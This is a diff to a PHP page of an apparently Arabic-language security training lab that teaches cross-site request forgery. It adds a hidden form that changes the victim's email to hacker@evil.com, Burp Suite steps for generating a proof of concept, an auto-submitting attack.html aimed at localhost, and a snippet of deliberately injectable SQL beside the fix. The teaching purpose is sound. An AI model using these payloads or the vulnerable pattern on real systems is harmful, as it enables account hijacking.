@@ -53,6 +53,17 @@ $current_email = $stmt->fetchColumn();
     <span class="badge bg-warning text-dark fs-6 px-3 py-2"><i class="fas fa-user-secret me-1"></i> Client-Side Attack</span>
 </div>
 
+<!-- مخطط معماري توضيحي لمسار هجوم CSRF -->
+<div class="card card-cyber mb-4 overflow-hidden border-info shadow-lg">
+    <div class="card-header bg-dark text-info fw-bold py-2 d-flex justify-content-between align-items-center">
+        <span><i class="fas fa-project-diagram me-2"></i> مخطط توضيحي: مسار هجوم Cross-Site Request Forgery (CSRF) والصفحات الخارجية</span>
+        <span class="badge bg-info text-dark">مخطط تعليمي للطلاب</span>
+    </div>
+    <div class="card-body p-0 text-center bg-black">
+        <img src="../assets/images/csrf_diagram.jpg" alt="CSRF Attack Flow Diagram" class="img-fluid" style="max-height: 380px; width: 100%; object-fit: contain;">
+    </div>
+</div>
+
 <div class="card card-cyber mb-4">
     <div class="card-cyber-header d-flex justify-content-between align-items-center">
         <h4 class="mb-0 text-info"><i class="fas fa-envelope me-2"></i> تعديل البريد الإلكتروني للمستخدم</h4>
@@ -92,38 +103,92 @@ $current_email = $stmt->fetchColumn();
             </div>
 
             <div class="col-md-6">
-                <div class="p-3 bg-danger bg-opacity-10 rounded border border-danger">
-                    <h5 class="text-danger fw-bold"><i class="fas fa-skull me-1"></i> محاكاة هجوم CSRF من صفحة المهاجم الخارجية:</h5>
-                    <p class="text-light small">
-                        تخيل أن الضحية فتحت صفحة ويب مشبوهة أو منتدى خارجي، وكان بداخل تلك الصفحة نموذج خفي يرسل الطلب تلقائياً عبر متصفح الضحية:
+                <div class="p-3 bg-danger bg-opacity-10 rounded border border-danger h-100">
+                    <h5 class="text-danger fw-bold mb-2"><i class="fas fa-skull me-1"></i> تطبيق عملي واقعي: إرسال رابط خارجي ملغوم للضحية:</h5>
+                    <p class="text-light small mb-3">
+                        في الحياة الواقعية، المهاجم لا يخترق الموقع مباشرة، بل ينشئ صفحة خارجية خادعة (مثل مسابقة أو موقع إخباري) ويرسل رابطها للضحية عبر واتساب أو البريد.
                     </p>
-                    <form method="POST" action="csrf.php" target="_self">
-                        <input type="hidden" name="action" value="update_email">
-                        <input type="hidden" name="email" value="hacker@evil.com">
-                        <input type="hidden" name="csrf_attack" value="1">
-                        <button type="submit" class="btn btn-danger w-100 fw-bold">
-                            <i class="fas fa-radiation me-1"></i> محاكاة نقرة الضحية على رابط المهاجم (Trigger CSRF Attack)
-                        </button>
-                    </form>
-                    <small class="text-muted d-block mt-2">
-                        في الوضع الضعيف، سينجح الطلب ويتم تغيير البريد إلى <code>hacker@evil.com</code> وتحصل على العلم!
-                    </small>
+                    
+                    <div class="d-grid gap-2 mb-3">
+                        <a href="fake_prize_site.html" target="_blank" class="btn btn-danger fw-bold py-2 shadow">
+                            <i class="fas fa-external-link-alt me-2"></i> فتح صفحة المهاجم الخارجية (fake_prize_site.html) في تبويب جديد
+                        </a>
+                        <form method="POST" action="csrf.php" target="_self" class="d-grid">
+                            <input type="hidden" name="action" value="update_email">
+                            <input type="hidden" name="email" value="hacker@evil.com">
+                            <input type="hidden" name="csrf_attack" value="1">
+                            <button type="submit" class="btn btn-outline-danger btn-sm">
+                                <i class="fas fa-bolt me-1"></i> أو تنفيذ الهجوم فوراً بنقرة زر سريعة هنا
+                            </button>
+                        </form>
+                    </div>
+
+                    <div class="p-2 bg-dark rounded border border-secondary small text-muted">
+                        <strong class="text-warning"><i class="fas fa-eye me-1"></i> تجربة عملية مع الطلاب:</strong>
+                        <ol class="mb-0 ps-3 mt-1 text-light">
+                            <li>تأكد أن بريدك هنا هو: <code><?= htmlspecialchars($current_email) ?></code>.</li>
+                            <li>افتح الرابط الخارجي بالأعلى في تبويب جديد واضغط على "استلام الجائزة".</li>
+                            <li>ارجع إلى هذا التبويب وحدّث الصفحة (F5)، ستجد أن بريدك تغيّر تلقائياً إلى <code>hacker_hijacked@evil.com</code> دون أن تدخل على هذا الموقع!</li>
+                        </ol>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <?= render_hints([
-            "اضغط على زر محاكاة هجوم CSRF لتجربة كيف يقبل الخادم الطلب بدون توكن حماية.",
-            "أو قم بتغيير البريد الإلكتروني واكتب فيه كلمة <code>hacker</code> ليتم اعتبار الهجوم ناجحاً.",
-            "جرب تحويل مستوى الحماية إلى Secure ولاحظ كيف سيفشل الهجوم الخارجي فوراً لأن المهاجم يجهل قيمة الـ CSRF Token الفريد."
-        ]); ?>
-
-        <?= render_code_comparison(
-            '// كود مصاب: استقبال التعديل مباشرة\n$new_email = $_POST["email"];\n$db->query("UPDATE users SET email = \'$new_email\' WHERE id = $uid");',
-            '// كود آمن: التحقق من توكن مشفر عشوائي\nif (!hash_equals($_SESSION["csrf_token"], $_POST["csrf_token"])) {\n    die("CSRF Token Invalid!");\n}\n// استخدام SameSite Cookies\nsetcookie("session_id", $sid, ["samesite" => "Strict", "httponly" => true]);',
-            'للحماية من CSRF: أضف Anti-CSRF Token عشوائي في كل نموذج حساس، واضبط إعداد SameSite=Strict في كوكيز الجلسة لمنع إرسالها من المواقع الخارجية.'
-        ); ?>
+        <!-- قسم الشرح باستخدام Burp Suite الاحترافي -->
+        <div class="card bg-dark border-info mt-4">
+            <div class="card-header bg-black text-info fw-bold d-flex justify-content-between align-items-center py-2">
+                <span><i class="fas fa-shield-virus me-2"></i> كيف ينفذ مختبرو الاختراق هذا الهجوم عملياً باستخدام أداة Burp Suite؟</span>
+                <span class="badge bg-info text-dark">Burp Suite Professional</span>
+            </div>
+            <div class="card-body p-3">
+                <div class="row align-items-center">
+                    <div class="col-lg-7">
+                        <h6 class="text-white fw-bold mb-2">خطوات توليد كود الاستغلال (Generate CSRF PoC) في Burp Suite:</h6>
+                        <ol class="text-light small mb-0 pe-3">
+                            <li class="mb-1">اضبط المتصفح ليمر عبر بروكسي <strong>Burp Suite</strong>.</li>
+                            <li class="mb-1">قم بتغيير البريد الإلكتروني في النموذج الطبيعي ليلتقط Burp طلب الـ <code>POST /pages/csrf.php</code> في تبويب <strong>HTTP history</strong>.</li>
+                            <li class="mb-1">اضغط بالزر الأيمن (Right-Click) على الطلب، واختر: <br><code class="text-warning bg-black px-2 py-0.5 rounded">Engagement tools -> Generate CSRF PoC</code>.</li>
+                            <li class="mb-1">من خيارات <strong>Options</strong>، فعّل خيار <strong class="text-info">Include auto-submit script</strong> لتوليد كود جافاسكربت يرسل الطلب تلقائياً بمجرد فتح الصفحة.</li>
+                            <li class="mb-1">اضغط على <strong>Copy HTML</strong> واحفظه كملف <code>attack.html</code> على سيرفر خارجي، ثم أرسل رابطه للضحية!</li>
+                        </ol>
+                    </div>
+                    <div class="col-lg-5 mt-3 mt-lg-0">
+                        <div class="p-2 bg-black rounded border border-secondary">
+                            <div class="d-flex justify-content-between align-items-center mb-1">
+                                <small class="text-info font-monospace">attack.html (PoC Code)</small>
+                                <span class="badge bg-secondary">HTML + JS</span>
+                            </div>
+                            <pre class="mb-0 text-success small" style="direction:ltr; text-align:left; max-height:160px; overflow-y:auto;"><code>&lt;!-- كود هجوم CSRF الناتج من Burp Suite --&gt;
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="http://localhost:8000/pages/csrf.php" method="POST"&gt;
+      &lt;input type="hidden" name="action" value="update_email" /&gt;
+      &lt;input type="hidden" name="email" value="hacker@evil.com" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      document.forms[0].submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
 </div>
+
+<?= render_hints([
+    "اضغط على زر محاكاة هجوم CSRF لتجربة كيف يقبل الخادم الطلب بدون توكن حماية.",
+    "أو قم بتغيير البريد الإلكتروني واكتب فيه كلمة <code>hacker</code> ليتم اعتبار الهجوم ناجحاً.",
+    "جرب تحويل مستوى الحماية إلى Secure ولاحظ كيف سيفشل الهجوم الخارجي فوراً لأن المهاجم يجهل قيمة الـ CSRF Token الفريد."
+]); ?>
+
+<?= render_code_comparison(
+    '// كود مصاب: استقبال التعديل مباشرة\n$new_email = $_POST["email"];\n$db->query("UPDATE users SET email = \'$new_email\' WHERE id = $uid");',
+    '// كود آمن: التحقق من توكن مشفر عشوائي\nif (!hash_equals($_SESSION["csrf_token"], $_POST["csrf_token"])) {\n    die("CSRF Token Invalid!");\n}\n// استخدام SameSite Cookies\nsetcookie("session_id", $sid, ["samesite" => "Strict", "httponly" => true]);',
+    'للحماية من CSRF: أضف Anti-CSRF Token عشوائي في كل نموذج حساس، واضبط إعداد SameSite=Strict في كوكيز الجلسة لمنع إرسالها من المواقع الخارجية.'
+); ?>
 
 <?php require_once __DIR__ . '/../includes/footer.php'; ?>
